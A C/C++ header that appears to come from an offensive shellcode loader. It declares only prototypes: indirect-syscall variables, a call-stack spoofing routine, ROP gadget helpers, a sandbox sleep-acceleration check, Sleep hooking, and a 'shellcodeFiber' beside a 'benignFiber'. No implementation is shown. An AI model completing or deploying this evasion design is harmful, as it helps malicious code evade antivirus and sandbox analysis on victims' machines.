#pragma once

#ifndef SLEEP_H
#define SLEEP_H

EXTERN_C DWORD dwSSN;
EXTERN_C PVOID qwJMP;
EXTERN_C PVOID NTAPI Spoof(PVOID a, ...);
EXTERN_C PVOID CallR12(PVOID Function, ULONGLONG nArgs, PVOID r12_gadget, ...);
NTAPI_FUNCTION CallMe();

extern PBYTE hNtdll, hKernel32;
extern std::vector<PVOID> callR12gadgets;
extern PVOID gadget;
extern NTSTATUS status;

// Check if process sleeptime is being fastforwarded
BOOL FiveHourEnergy();

// Sleeping without calling Sleep()
VOID ImNotSleepingIPromise(DWORD milliseconds);

// Hook Sleep and SleepEx
VOID ReSleep();

extern SyscallEntry NtCreateEvent;
extern SyscallEntry sysNtWaitForSingleObject;

extern LPVOID mainFiber;
extern LPVOID benignFiber;
extern LPVOID shellcodeFiber;

#endif
